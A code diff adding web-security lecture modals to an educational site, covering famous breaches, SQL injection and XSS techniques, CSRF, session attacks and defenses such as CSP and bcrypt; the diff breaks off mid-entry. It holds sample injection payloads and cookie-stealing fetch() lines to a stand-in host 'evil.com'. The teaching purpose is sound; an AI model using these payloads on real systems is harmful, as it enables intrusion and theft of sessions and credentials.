@@ -4512,6 +4512,1026 @@ type Status = "pending" | "approved" | "rejected" | "cancelled";
 // (Because "cancelled" falls through to default)</code></pre>
                     </div>
                 `
+            },
+            // ==================== WEB SECURITY LECTURE ====================
+            // Famous Breaches
+            'breach-equifax': {
+                title: 'Equifax Breach (2017)',
+                body: `
+                    <p>One of the largest data breaches in history — <strong>147 million Americans</strong> affected.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">What Happened</div>
+                        <ul>
+                            <li>Unpatched Apache Struts vulnerability (CVE-2017-5638)</li>
+                            <li>Patch available for 2 months before breach</li>
+                            <li>Attackers had access for 76 days</li>
+                            <li>Stolen: SSNs, birth dates, addresses, driver's licenses</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Consequences</div>
+                        <ul>
+                            <li>$700M settlement with FTC</li>
+                            <li>CEO, CIO, CSO all resigned</li>
+                            <li>Stock dropped 35%</li>
+                            <li>Criminal charges for insider trading</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Lesson</div>
+                        <p><strong>Patch your dependencies.</strong> The vulnerability was known and patchable.</p>
+                    </div>
+                `
+            },
+            'breach-yahoo': {
+                title: 'Yahoo Breach (2013-2014)',
+                body: `
+                    <p>The largest data breach ever — <strong>3 billion accounts</strong> compromised.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">What Happened</div>
+                        <ul>
+                            <li>State-sponsored hackers (allegedly Russia)</li>
+                            <li>Forged cookies allowed access without passwords</li>
+                            <li>Breach not disclosed until 2016 (during Verizon acquisition)</li>
+                            <li>Initially reported as 1B, later revised to ALL 3B accounts</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Consequences</div>
+                        <ul>
+                            <li>$350M reduction in Verizon acquisition price</li>
+                            <li>$117.5M settlement for affected users</li>
+                            <li>SEC $35M fine for late disclosure</li>
+                        </ul>
+                    </div>
+                `
+            },
+            'breach-linkedin': {
+                title: 'LinkedIn Breach (2012)',
+                body: `
+                    <p><strong>165 million passwords</strong> leaked due to weak hashing.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">What Happened</div>
+                        <ul>
+                            <li>SQL injection gave access to password database</li>
+                            <li>Passwords stored with SHA-1 — <strong>no salt</strong></li>
+                            <li>90% of passwords cracked within hours</li>
+                            <li>Sold on dark web for $2,200</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Why Unsalted Hashes Fail</div>
+                        <p>Same password = same hash. Attackers pre-compute hashes (rainbow tables) and crack millions instantly.</p>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Lesson</div>
+                        <p>Use <strong>bcrypt or Argon2</strong> — they're designed for passwords with built-in salting.</p>
+                    </div>
+                `
+            },
+            'breach-sony': {
+                title: 'Sony PSN Breach (2011)',
+                body: `
+                    <p><strong>77 million accounts</strong> stolen via SQL injection.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">What Happened</div>
+                        <ul>
+                            <li>Basic SQL injection attack on PlayStation Network</li>
+                            <li>Personal data: names, addresses, emails, birth dates</li>
+                            <li>Credit card data possibly exposed</li>
+                            <li>PSN offline for 23 days</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Consequences</div>
+                        <ul>
+                            <li>$171M in costs</li>
+                            <li>Class action lawsuits</li>
+                            <li>Congressional hearings</li>
+                            <li>Free games as apology to users</li>
+                        </ul>
+                    </div>
+                `
+            },
+            // Attacker Vectors
+            'vector-input': {
+                title: 'User Input Reaching Database',
+                body: `
+                    <p>Attackers look for any input that gets processed by backend systems.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Attack Surfaces</div>
+                        <ul>
+                            <li>Search boxes → SQL injection</li>
+                            <li>Login forms → authentication bypass</li>
+                            <li>Comment fields → XSS, stored payloads</li>
+                            <li>File uploads → malicious files</li>
+                            <li>URL parameters → parameter tampering</li>
+                            <li>HTTP headers → header injection</li>
+                        </ul>
+                    </div>
+                `
+            },
+            'vector-auth': {
+                title: 'Weak Authentication Flows',
+                body: `
+                    <p>Common authentication weaknesses attackers exploit.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Vulnerabilities</div>
+                        <ul>
+                            <li>No rate limiting → brute force attacks</li>
+                            <li>Predictable session tokens → session hijacking</li>
+                            <li>Password reset via email without verification</li>
+                            <li>Remember me tokens that never expire</li>
+                            <li>Missing MFA on sensitive operations</li>
+                        </ul>
+                    </div>
+                `
+            },
+            'vector-access': {
+                title: 'Direct Object References',
+                body: `
+                    <p>Predictable IDs in URLs that allow accessing other users' data.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Vulnerable patterns
+/api/users/123/documents
+/api/orders/1001
+/download?file=report_123.pdf
+
+// Attacker just increments:
+/api/users/124/documents  // Someone else's!
+/api/orders/1002          // Another order!</code></pre>
+                    </div>
+                `
+            },
+            'vector-exposed': {
+                title: 'Exposed Configuration',
+                body: `
+                    <p>Sensitive files accidentally made public.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Commonly Exposed</div>
+                        <ul>
+                            <li><code>/.git/</code> — full source code</li>
+                            <li><code>/.env</code> — environment variables, API keys</li>
+                            <li><code>/config.php</code> — database credentials</li>
+                            <li><code>/backup.sql</code> — database dumps</li>
+                            <li><code>/phpinfo.php</code> — server configuration</li>
+                            <li><code>/.aws/credentials</code> — AWS keys</li>
+                        </ul>
+                    </div>
+                `
+            },
+            'vector-errors': {
+                title: 'Verbose Error Messages',
+                body: `
+                    <p>Detailed errors reveal system internals to attackers.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Dangerous error exposed to user:
+Error: ER_PARSE_ERROR: You have an error in your SQL
+syntax; check the manual... near 'SELECT * FROM users
+WHERE id = '' OR '1'='1'' at line 1
+
+// This reveals:
+// - Database type (MySQL)
+// - Table name (users)
+// - Column name (id)
+// - Vulnerable to SQL injection</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Fix</div>
+                        <p>Log detailed errors server-side. Show generic messages to users.</p>
+                    </div>
+                `
+            },
+            'vector-outdated': {
+                title: 'Outdated Dependencies',
+                body: `
+                    <p>Known vulnerabilities in old library versions.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">The Problem</div>
+                        <ul>
+                            <li>Dependencies have security vulnerabilities</li>
+                            <li>CVEs published with exploitation details</li>
+                            <li>Attackers scan for known vulnerable versions</li>
+                            <li>Automated tools exploit at scale</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Defense</div>
+                        <ul>
+                            <li><code>npm audit</code> — check for vulnerabilities</li>
+                            <li>Dependabot / Renovate — automated updates</li>
+                            <li>Regular dependency updates</li>
+                        </ul>
+                    </div>
+                `
+            },
+            // SQL Injection Real Attacks
+            'sqli-heartland': {
+                title: 'Heartland Payment Systems (2008)',
+                body: `
+                    <p>The largest credit card breach in history at that time.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">The Attack</div>
+                        <ul>
+                            <li>SQL injection on company website</li>
+                            <li>Installed malware on payment processing servers</li>
+                            <li><strong>134 million credit cards</strong> stolen</li>
+                            <li>Undetected for 6+ months</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">The Attacker</div>
+                        <p>Albert Gonzalez — also behind TJX breach. Sentenced to 20 years in federal prison.</p>
+                    </div>
+                `
+            },
+            'sqli-sony': {
+                title: 'Sony Pictures - LulzSec (2011)',
+                body: `
+                    <p>Hacker group LulzSec embarrassed Sony with basic SQL injection.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">The Attack</div>
+                        <ul>
+                            <li>"A very simple SQL injection" — LulzSec statement</li>
+                            <li>1 million user accounts stolen</li>
+                            <li>Passwords stored in <strong>plain text</strong></li>
+                            <li>Published everything online</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">LulzSec Statement</div>
+                        <p>"Sony stored over 1 million passwords of its customers in plain text... disgraceful and insecure."</p>
+                    </div>
+                `
+            },
+            'sqli-talktalk': {
+                title: 'TalkTalk Breach (2015)',
+                body: `
+                    <p>A <strong>17-year-old</strong> breached a major UK telecom with basic SQLi.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">The Attack</div>
+                        <ul>
+                            <li>SQL injection on customer portal</li>
+                            <li>157,000 customer records stolen</li>
+                            <li>Bank details exposed</li>
+                            <li>Used for fraud and identity theft</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Consequences</div>
+                        <ul>
+                            <li>£400,000 ICO fine</li>
+                            <li>CEO Dido Harding resigned</li>
+                            <li>100,000+ customers left</li>
+                            <li>Stock dropped 10%</li>
+                        </ul>
+                    </div>
+                `
+            },
+            // SQL Injection Techniques
+            'sqli-union': {
+                title: 'UNION-Based SQL Injection',
+                body: `
+                    <p>Extract data from other tables by appending a UNION SELECT.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>-- Original query
+SELECT name, price FROM products WHERE id = 1
+
+-- Attacker input: 1 UNION SELECT username, password FROM users--
+SELECT name, price FROM products WHERE id = 1
+UNION SELECT username, password FROM users--
+
+-- Result shows product data AND user credentials!</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Requirements</div>
+                        <ul>
+                            <li>Same number of columns in both queries</li>
+                            <li>Compatible data types</li>
+                            <li>Attacker can see results</li>
+                        </ul>
+                    </div>
+                `
+            },
+            'sqli-blind': {
+                title: 'Blind SQL Injection',
+                body: `
+                    <p>Extract data one bit at a time based on true/false responses.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>-- Check if first char of password is 'a'
+' AND SUBSTRING(password,1,1)='a'--
+-- Page loads normally = TRUE
+-- Error or different response = FALSE
+
+-- Binary search through all characters
+' AND ASCII(SUBSTRING(password,1,1))>64--  // Is it > 64?
+' AND ASCII(SUBSTRING(password,1,1))>96--  // Is it > 96?
+
+-- Eventually extract entire password character by character</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Why It Works</div>
+                        <p>Even without seeing query results, different app behavior (error vs success) leaks information.</p>
+                    </div>
+                `
+            },
+            'sqli-time': {
+                title: 'Time-Based Blind SQL Injection',
+                body: `
+                    <p>When there's no visible difference, use time delays to infer data.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>-- If condition is true, wait 5 seconds
+' AND IF(1=1, SLEEP(5), 0)--
+
+-- Check if admin user exists
+' AND IF(EXISTS(SELECT * FROM users WHERE username='admin'), SLEEP(5), 0)--
+
+-- If response takes 5 seconds = TRUE
+-- If response is immediate = FALSE
+
+-- Extract data by timing
+' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Defense</div>
+                        <p>Parameterized queries prevent ALL types of SQL injection.</p>
+                    </div>
+                `
+            },
+            'sqli-second': {
+                title: 'Second-Order SQL Injection',
+                body: `
+                    <p>Payload stored in database, executed later in different context.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>-- Step 1: Register with malicious username
+Username: admin'--
+
+-- Stored safely (parameterized insert)
+INSERT INTO users (username) VALUES ('admin''--')
+
+-- Step 2: Later, vulnerable code uses username
+-- Password reset query (vulnerable!)
+query = "UPDATE users SET password='newpass' WHERE username='" + user.username + "'"
+
+-- Becomes:
+UPDATE users SET password='newpass' WHERE username='admin'--'
+
+-- Resets admin password!</code></pre>
+                    </div>
+                `
+            },
+            // Samy Worm
+            'samy-worm': {
+                title: 'The Samy Worm — Full Story',
+                body: `
+                    <p>The fastest spreading virus in history, written by a 19-year-old.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">The Exploit</div>
+                        <ul>
+                            <li>MySpace filtered &lt;script&gt; but not CSS expressions</li>
+                            <li>Used JavaScript in CSS: <code>style="background:url('javascript:...')"</code></li>
+                            <li>Bypassed innerHTML filtering with encoded characters</li>
+                            <li>Self-replicated by modifying viewer's profile</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">The Spread</div>
+                        <ul>
+                            <li><strong>Hour 1:</strong> 1 friend infected</li>
+                            <li><strong>Hour 8:</strong> 1,000+ infected</li>
+                            <li><strong>Hour 18:</strong> 1,000,000+ infected</li>
+                            <li>Each victim spread to all their friends</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Aftermath</div>
+                        <p>Samy Kamkar was raided by Secret Service, sentenced to 3 years probation, banned from internet, 90 days community service.</p>
+                    </div>
+                `
+            },
+            // XSS Types
+            'xss-stored-detail': {
+                title: 'Stored XSS — Persistent Attack',
+                body: `
+                    <p>Malicious script permanently stored on target server.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Attacker posts comment:
+"Great article! <script>
+    fetch('https://evil.com/steal?cookie=' + document.cookie);
+</script>"
+
+// Stored in database, served to ALL visitors
+// Every visitor's session stolen!</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Common Targets</div>
+                        <ul>
+                            <li>Comments and reviews</li>
+                            <li>User profiles and bios</li>
+                            <li>Forum posts</li>
+                            <li>Support tickets</li>
+                        </ul>
+                    </div>
+                `
+            },
+            'xss-reflected-detail': {
+                title: 'Reflected XSS — URL-Based Attack',
+                body: `
+                    <p>Script in URL parameter reflected back in the response.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Vulnerable search page
+https://shop.com/search?q=<script>alert('XSS')</script>
+
+// Server renders:
+<p>Search results for: <script>alert('XSS')</script></p>
+
+// Attacker sends victim a link:
+https://shop.com/search?q=<script>stealCookies()</script>
+
+// Victim clicks, their browser executes the script</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Attack Vector</div>
+                        <p>Requires victim to click malicious link. Often distributed via phishing emails.</p>
+                    </div>
+                `
+            },
+            'xss-dom-detail': {
+                title: 'DOM-Based XSS — Client-Side Attack',
+                body: `
+                    <p>Vulnerability in client-side JavaScript, not server response.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Vulnerable JavaScript
+const name = location.hash.substring(1);
+document.getElementById('welcome').innerHTML = 'Hello, ' + name;
+
+// URL: https://site.com/#<img src=x onerror=alert('XSS')>
+
+// The script never reaches the server!
+// All processing happens in the browser</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Dangerous Sinks</div>
+                        <ul>
+                            <li><code>innerHTML</code>, <code>outerHTML</code></li>
+                            <li><code>document.write()</code></li>
+                            <li><code>eval()</code>, <code>setTimeout(string)</code></li>
+                            <li><code>location.href</code>, <code>location.assign()</code></li>
+                        </ul>
+                    </div>
+                `
+            },
+            // CSP
+            'csp-script': {
+                title: 'CSP script-src Directive',
+                body: `
+                    <p>Controls which scripts can execute on your page.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Strict policy — blocks inline scripts!
+script-src 'self';
+
+// With trusted CDN
+script-src 'self' https://cdn.jsdelivr.net;
+
+// Allow inline with nonce (unique per request)
+script-src 'self' 'nonce-abc123';
+<script nonce="abc123">/* allowed */</script>
+<script>/* blocked! */</script></code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Why This Kills XSS</div>
+                        <p>Even if attacker injects <code>&lt;script&gt;evil()&lt;/script&gt;</code>, browser refuses to execute it without the correct nonce.</p>
+                    </div>
+                `
+            },
+            'csp-connect': {
+                title: 'CSP connect-src Directive',
+                body: `
+                    <p>Controls where your page can send data (fetch, XHR, WebSocket).</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Only allow API calls to your domain
+connect-src 'self' https://api.yoursite.com;
+
+// XSS payload tries to send data to attacker:
+fetch('https://evil.com/steal?data=' + secrets);
+
+// Browser blocks it:
+// Refused to connect to 'https://evil.com'
+// because it violates CSP connect-src directive</code></pre>
+                    </div>
+                `
+            },
+            'csp-frame': {
+                title: 'CSP frame-ancestors Directive',
+                body: `
+                    <p>Prevents your site from being embedded in iframes (clickjacking protection).</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Prevent embedding completely
+frame-ancestors 'none';
+
+// Only allow same origin
+frame-ancestors 'self';
+
+// Allow specific parent sites
+frame-ancestors 'self' https://trusted-partner.com;</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Clickjacking Attack</div>
+                        <p>Attacker overlays invisible iframe of your site over a fake page. User thinks they're clicking attacker's button, actually clicking yours.</p>
+                    </div>
+                `
+            },
+            // Password Storage
+            'shame-plaintext': {
+                title: 'Plain Text Passwords',
+                body: `
+                    <p>The worst possible security — passwords stored as-is.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">RockYou Breach (2009)</div>
+                        <ul>
+                            <li>32 million passwords in plain text</li>
+                            <li>Database leaked via SQL injection</li>
+                            <li>Became the standard password cracking wordlist</li>
+                            <li>Still used by security researchers today</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Top Passwords Found</div>
+                        <p>123456, 12345, 123456789, password, iloveyou, princess, rockyou</p>
+                    </div>
+                `
+            },
+            'shame-md5': {
+                title: 'MD5 Hash (No Salt)',
+                body: `
+                    <p>Fast hash designed for integrity checking, not passwords.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Problems</div>
+                        <ul>
+                            <li><strong>Too fast</strong> — billions of hashes/second on GPU</li>
+                            <li><strong>Rainbow tables</strong> — pre-computed hash lookups</li>
+                            <li><strong>No salt</strong> — same password = same hash</li>
+                            <li><strong>Collision attacks</strong> — cryptographically broken</li>
+                        </ul>
+                    </div>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Two users with same password
+MD5("password123") = "482c811..."  // User 1
+MD5("password123") = "482c811..."  // User 2 (same!)
+
+// Attacker cracks one, gets both</code></pre>
+                    </div>
+                `
+            },
+            'shame-sha1': {
+                title: 'SHA-1 Unsalted',
+                body: `
+                    <p>Slightly better than MD5, but still fundamentally broken for passwords.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Adobe Breach (2013)</div>
+                        <ul>
+                            <li>153 million accounts</li>
+                            <li>Used 3DES encryption (reversible!) not hashing</li>
+                            <li>Same password = same ciphertext</li>
+                            <li>Password hints stored in plain text</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">The Crossword Puzzle</div>
+                        <p>Security researchers created a crossword puzzle from Adobe password hints. Most common password hint: "123456" appeared 1.9 million times.</p>
+                    </div>
+                `
+            },
+            'shame-bcrypt': {
+                title: 'bcrypt — The Right Way',
+                body: `
+                    <p>Password hashing algorithm designed to be slow and resistant to cracking.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// bcrypt hash includes:
+// - Algorithm identifier ($2b$)
+// - Cost factor (12 = 2^12 iterations)
+// - Random salt (22 chars)
+// - Hash (31 chars)
+
+$2b$12$LQv3c1yqBWVHxkd0LHAkCO/YMDEgmUW1E7RzgNXCp.M3Kx2oKJ7v2</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Why bcrypt Works</div>
+                        <ul>
+                            <li><strong>Intentionally slow</strong> — ~100ms per hash</li>
+                            <li><strong>Adjustable cost</strong> — increase as hardware gets faster</li>
+                            <li><strong>Built-in salt</strong> — each password unique</li>
+                            <li><strong>GPU-resistant</strong> — memory-hard algorithm</li>
+                        </ul>
+                    </div>
+                `
+            },
+            // Session Attacks
+            'session-hijack': {
+                title: 'Session Hijacking',
+                body: `
+                    <p>Attacker steals session cookie and impersonates the user.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Attack Vectors</div>
+                        <ul>
+                            <li><strong>XSS</strong> — steal cookie via JavaScript</li>
+                            <li><strong>Network sniffing</strong> — intercept on HTTP</li>
+                            <li><strong>Malware</strong> — steal from browser storage</li>
+                            <li><strong>Physical access</strong> — copy from browser</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Defenses</div>
+                        <ul>
+                            <li><code>HttpOnly</code> — blocks JavaScript access</li>
+                            <li><code>Secure</code> — HTTPS only</li>
+                            <li>Short expiration times</li>
+                            <li>Bind session to IP/User-Agent</li>
+                        </ul>
+                    </div>
+                `
+            },
+            'session-fixation': {
+                title: 'Session Fixation',
+                body: `
+                    <p>Attacker sets the session ID before victim logs in.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>1. Attacker gets valid session: SESS=abc123
+2. Attacker tricks victim into using it:
+   <a href="https://bank.com/?SESS=abc123">Click here</a>
+3. Victim clicks, logs in with SESS=abc123
+4. Attacker uses SESS=abc123 — logged in as victim!</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Defense</div>
+                        <p><strong>Regenerate session ID on login.</strong> Old session becomes invalid.</p>
+                    </div>
+                `
+            },
+            // CSRF
+            'csrf-detail': {
+                title: 'CSRF Attack Explained',
+                body: `
+                    <p>Force authenticated users to perform unwanted actions.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">How It Works</div>
+                        <ol>
+                            <li>User logs into bank.com</li>
+                            <li>Session cookie stored in browser</li>
+                            <li>User visits evil.com (in another tab)</li>
+                            <li>evil.com makes request to bank.com</li>
+                            <li>Browser automatically includes cookies!</li>
+                            <li>Bank thinks it's a legitimate request</li>
+                        </ol>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Real Example: Netflix (2006)</div>
+                        <p>CSRF allowed attackers to add DVDs to victims' queues, change shipping addresses, and access account details.</p>
+                    </div>
+                `
+            },
+            'csrf-token': {
+                title: 'CSRF Token Defense',
+                body: `
+                    <p>Include a secret token that attackers can't guess.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Server generates random token per session
+const csrfToken = crypto.randomBytes(32).toString('hex');
+session.csrfToken = csrfToken;
+
+// Include in form
+<form action="/transfer" method="POST">
+    <input type="hidden" name="_csrf" value="{{csrfToken}}">
+    <input name="amount" value="100">
+    <button>Transfer</button>
+</form>
+
+// Server validates
+if (req.body._csrf !== req.session.csrfToken) {
+    return res.status(403).send('Invalid CSRF token');
+}</code></pre>
+                    </div>
+                `
+            },
+            'csrf-samesite': {
+                title: 'SameSite Cookie Defense',
+                body: `
+                    <p>Browser doesn't send cookie on cross-site requests.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// SameSite=Strict — most secure
+// Cookie never sent cross-site
+Set-Cookie: session=abc; SameSite=Strict
+
+// SameSite=Lax — allows GET navigations
+// Cookie sent on links, not forms
+Set-Cookie: session=abc; SameSite=Lax
+
+// Modern browsers default to Lax</code></pre>
+                    </div>
+                `
+            },
+            'csrf-origin': {
+                title: 'Origin Header Check',
+                body: `
+                    <p>Verify the request originated from your site.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>app.post('/api/*', (req, res, next) => {
+    const origin = req.headers.origin;
+    const referer = req.headers.referer;
+
+    const allowed = ['https://mysite.com', 'https://www.mysite.com'];
+
+    if (!allowed.includes(origin)) {
+        return res.status(403).json({
+            error: 'Invalid origin'
+        });
+    }
+    next();
+});</code></pre>
+                    </div>
+                `
+            },
+            // Privilege Escalation
+            'priv-horizontal': {
+                title: 'Horizontal Privilege Escalation',
+                body: `
+                    <p>Access other users' data at the same privilege level.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// User A views their profile
+GET /api/users/100/settings
+
+// User A changes ID to access User B
+GET /api/users/101/settings  // User B's data!
+
+// Common in:
+// - Sequential integer IDs
+// - Missing ownership checks
+// - Predictable resource identifiers</code></pre>
+                    </div>
+                `
+            },
+            'priv-vertical': {
+                title: 'Vertical Privilege Escalation',
+                body: `
+                    <p>Gain higher privileges than assigned.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Trusting client-provided role
+POST /api/register
+{ "name": "Hacker", "email": "...", "role": "admin" }
+
+// Hidden admin endpoints
+GET /admin/users  // No auth check!
+POST /api/internal/deleteAll
+
+// Manipulating JWT
+{ "user": "attacker", "role": "admin" }
+// If secret key is weak/leaked</code></pre>
+                    </div>
+                `
+            },
+            // Developer Mistakes
+            'mistake-git': {
+                title: 'Exposed .git Folder',
+                body: `
+                    <p>Entire source code and history downloadable from production server.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">What's Exposed</div>
+                        <ul>
+                            <li>All source code</li>
+                            <li>Complete commit history</li>
+                            <li>All branches (including "secret" ones)</li>
+                            <li>Hardcoded secrets in old commits</li>
+                            <li>Developer emails and names</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Prevention</div>
+                        <ul>
+                            <li>Block /.git in web server config</li>
+                            <li>Don't deploy .git folder</li>
+                            <li>Use CI/CD that excludes .git</li>
+                        </ul>
+                    </div>
+                `
+            },
+            'mistake-env': {
+                title: 'Committed .env File',
+                body: `
+                    <p>API keys and passwords pushed to version control.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">The Problem</div>
+                        <ul>
+                            <li>Once committed, in git history forever</li>
+                            <li>Even after deletion, recoverable</li>
+                            <li>Bots scan GitHub continuously for secrets</li>
+                            <li>AWS keys found within minutes</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">If You Committed Secrets</div>
+                        <ol>
+                            <li>Rotate the credentials IMMEDIATELY</li>
+                            <li>Use git-filter-branch to remove from history</li>
+                            <li>Force push (coordinate with team)</li>
+                            <li>Consider repository compromised</li>
+                        </ol>
+                    </div>
+                `
+            },
+            'mistake-logs': {
+                title: 'Secrets in Logs',
+                body: `
+                    <p>Sensitive data logged in plain text, often to third-party services.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// WRONG — logs password!
+console.log('Login attempt:', req.body);
+// { username: "alice", password: "secret123" }
+
+// WRONG — logs token!
+console.log('Request headers:', req.headers);
+// { authorization: "Bearer eyJhbG..." }
+
+// RIGHT — redact sensitive fields
+const safeBody = { ...req.body, password: '[REDACTED]' };
+console.log('Login attempt:', safeBody);</code></pre>
+                    </div>
+                `
+            },
+            'mistake-url': {
+                title: 'Secrets in URLs',
+                body: `
+                    <p>Tokens in query strings get logged, shared, and leaked.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Where URLs Get Logged</div>
+                        <ul>
+                            <li>Browser history</li>
+                            <li>Web server logs</li>
+                            <li>Proxy servers</li>
+                            <li>Referrer headers (sent to other sites!)</li>
+                            <li>Analytics tools</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Fix</div>
+                        <p>Use Authorization header instead of URL parameters for tokens.</p>
+                    </div>
+                `
+            },
+            'mistake-error': {
+                title: 'Verbose Error Messages',
+                body: `
+                    <p>Detailed errors reveal system internals to attackers.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>// Production error page showing:
+Error: ENOENT: no such file or directory
+at /var/www/app/node_modules/express/lib/router.js:174
+SQL Query: SELECT * FROM users WHERE id = '...'
+Database: mysql://user:password@localhost:3306/prod
+
+// Reveals:
+// - Technology stack
+// - File paths
+// - SQL queries
+// - Database credentials!</code></pre>
+                    </div>
+                `
+            },
+            'mistake-backup': {
+                title: 'Exposed Backup Files',
+                body: `
+                    <p>Backup and temporary files accidentally served.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Commonly Found</div>
+                        <ul>
+                            <li><code>/backup.sql</code> — database dump</li>
+                            <li><code>/config.php.bak</code> — config backup</li>
+                            <li><code>/index.php~</code> — vim backup</li>
+                            <li><code>/.DS_Store</code> — macOS directory info</li>
+                            <li><code>/dump.rdb</code> — Redis dump</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Prevention</div>
+                        <p>Block common backup extensions in web server config. Never create backups in web-accessible directories.</p>
+                    </div>
+                `
+            },
+            // API Key Horror Story
+            'api-key-horror': {
+                title: 'AWS Keys on GitHub — Horror Stories',
+                body: `
+                    <p>Real stories of developers losing thousands to crypto miners.</p>
+                    <div class="modal-section">
+                        <div class="modal-section-title">How Fast Are Keys Found?</div>
+                        <ul>
+                            <li>Bots scan GitHub in real-time</li>
+                            <li>Average time to compromise: <strong>under 1 minute</strong></li>
+                            <li>Automated crypto mining starts immediately</li>
+                            <li>Bills can reach $50,000+ overnight</li>
+                        </ul>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">AWS Response</div>
+                        <p>AWS now scans GitHub themselves and auto-quarantines exposed keys. But damage often done before detection.</p>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Prevention</div>
+                        <ul>
+                            <li>Never commit credentials</li>
+                            <li>Use environment variables</li>
+                            <li>Enable AWS billing alerts</li>
+                            <li>Use IAM roles with minimal permissions</li>
+                        </ul>
+                    </div>
+                `
+            },
+            // Security Headers
+            'header-hsts': {
+                title: 'Strict-Transport-Security (HSTS)',
+                body: `
+                    <p>Force browser to always use HTTPS.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
+// Browser remembers for 1 year
+// All subdomains must use HTTPS
+// Can be added to browser preload list</code></pre>
+                    </div>
+                    <div class="modal-section">
+                        <div class="modal-section-title">Prevents</div>
+                        <ul>
+                            <li>SSL stripping attacks</li>
+                            <li>Accidental HTTP requests</li>
+                            <li>Mixed content issues</li>
+                        </ul>
+                    </div>
+                `
+            },
+            'header-cto': {
+                title: 'X-Content-Type-Options',
+                body: `
